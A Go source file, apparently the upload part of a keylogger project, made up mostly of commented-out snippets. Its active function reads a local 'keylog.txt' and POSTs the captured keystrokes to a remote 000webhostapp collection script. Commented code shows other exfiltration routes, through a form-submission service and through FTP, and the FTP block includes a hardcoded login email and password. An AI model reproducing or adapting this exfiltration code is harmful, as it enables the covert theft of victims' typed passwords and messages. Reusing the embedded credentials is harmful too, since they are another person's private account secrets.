// package main

// import (
// 	"fmt"
// 	"os"
// 	"path/filepath"
// )

// func main() {
// 	exePath, err := os.Executable()
// 	if err != nil {
// 		fmt.Println(err)
// 		return
// 	}
// 	exeDir := filepath.Dir(exePath)
// 	fmt.Println("Executable directory:", exeDir)

// }

// package main

// import (
// 	"fmt"
// 	"log"
// 	"os"

// 	"github.com/jlaffaye/ftp"
// )

// func uploadFileToFTP(server, user, password, filePath, remotePath string) error {
// 	// Connect to the FTP server
// 	c, err := ftp.Dial(server)
// 	if err != nil {
// 		return fmt.Errorf("could not connect to FTP server: %v", err)
// 	}
// 	defer c.Quit()

// 	// Login to the FTP server
// 	err = c.Login(user, password)
// 	if err != nil {
// 		return fmt.Errorf("could not login to FTP server: %v", err)
// 	}

// 	// Open the file to upload
// 	file, err := os.Open(filePath)
// 	if err != nil {
// 		return fmt.Errorf("could not open file: %v", err)
// 	}
// 	defer file.Close()

// 	// Upload the file
// 	err = c.Stor(remotePath, file)
// 	if err != nil {
// 		return fmt.Errorf("could not upload file: %v", err)
// 	}

// 	return nil
// }

// func main() {
// 	// FTP server credentials
// 	server := "files.000webhost.com:21"
// 	user := "devilarises28@gmail.com"
// 	password := "Y&4?!vC@GxPN%R/"

// 	// Local file path and remote file path
// 	filePath := "example.txt"                // Path to the file you want to upload
// 	remotePath := "/public_html/example.txt" // Path where you want to upload the file on the server

// 	// Upload the file
// 	err := uploadFileToFTP(server, user, password, filePath, remotePath)
// 	if err != nil {
// 		log.Fatalf("Error uploading file: %v", err)
// 	}

// 	fmt.Println("File uploaded successfully!")
// }

package main

import (
	"fmt"
	"net/http"
	"os"
)

func maiiin() {
	// Open the file
	// exePath, err := os.Executable()
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// exePath, err = filepath.Abs(exePath)
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// // Get the directory of the executable
	// exeDir := filepath.Dir(exePath)
	// file, err := os.OpenFile(exeDir+"\\data\\keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	file, err := os.OpenFile("keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	// file, err := os.Open("example.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()
	// content := []byte("data=")
	// content, _ = os.ReadFile("example.txt")

	// Create a new buffer to store the request body
	// body := &bytes.Buffer{}

	// Create a new multipart writer
	// writer := multipart.NewWriter(body)

	// Create a form field for the file
	// part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
	// if err != nil {
	// 	fmt.Println("1", err)
	// 	return
	// }

	// // Copy the file content to the form field
	// _, err = io.Copy(part, file)
	// if err != nil {
	// 	fmt.Println("2", err)
	// 	return
	// }
	// // Close the multipart writer
	// writer.Close()

	// Create a new HTTP request with the POST method
	req, err := http.NewRequest("POST", "https://passless-paint.000webhostapp.com/save_data.php", file)
	// req, err := http.NewRequest("POST", "https://formsubmit.co/28ab7ddf1747f3638636296e8af03bf9", body)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Set the content type
	// req.Header.Set("Content-Type", )

	// Perform the HTTP request
	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer res.Body.Close()

	// Check the response status
	if res.StatusCode != http.StatusOK {
		fmt.Println("Upload failed:", res.Status)
		return
	}

	fmt.Println("File uploaded successfully!")
}

// package main

// import (
// 	"context"
// 	"fmt"
// 	"io"
// 	"log"
// 	"net/http"
// 	"os"

// 	"go.mongodb.org/mongo-driver/mongo"
// 	"go.mongodb.org/mongo-driver/mongo/options"
// )

// // Data struct to hold the data sent via POST request
// type Data struct {
// 	Text string `json:"text"`
// }

// func main() {
// 	// Connect to MongoDB
// 	client, err := mongo.NewClient(options.Client().ApplyURI("mongodb://localhost:27017"))
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	ctx := context.Background()
// 	err = client.Connect(ctx)
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	defer client.Disconnect(ctx)

// 	// Create a MongoDB collection
// 	collection := client.Database("mydatabase").Collection("mycollection")

// 	// Define a handler function for the /upload endpoint
// 	// http.HandleFunc("/upload",
// 	// })

// 	file, err := os.Open("data.txt")
// 	if err != nil {
// 		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
// 		log.Println("Failed to open file:", err)
// 		return
// 	}
// 	defer file.Close()

// 	// Read the file content
// 	content, err := io.ReadAll(file)
// 	if err != nil {
// 		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
// 		log.Println("Failed to read file:", err)
// 		return
// 	}

// 	// Decode the file content to JSON
// 	var data Data
// 	data.Text = string(content)

// 	// Insert the data into the MongoDB collection
// 	_, err = collection.InsertOne(ctx, data)
// 	if err != nil {
// 		// http.Error(w, "Internal Server Error", http.StatusInternalServerError)
// 		log.Println("Failed to insert data into MongoDB:", err)
// 		return
// 	}

// 	// Start the HTTP server
// 	// log.Println("Server listening on port 8080...")
// 	// log.Fatal(http.ListenAndServe(":8080", nil))
// }

// func Work(w http.ResponseWriter, r *http.Request) {
// 	// Check if the request method is POST
// 	if r.Method != http.MethodPost {
// 		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
// 		return
// 	}

// 	// Read the file

// 	// Send a success response
// 	w.WriteHeader(http.StatusOK)
// 	fmt.Fprintln(w, "Data uploaded successfully!")
// }
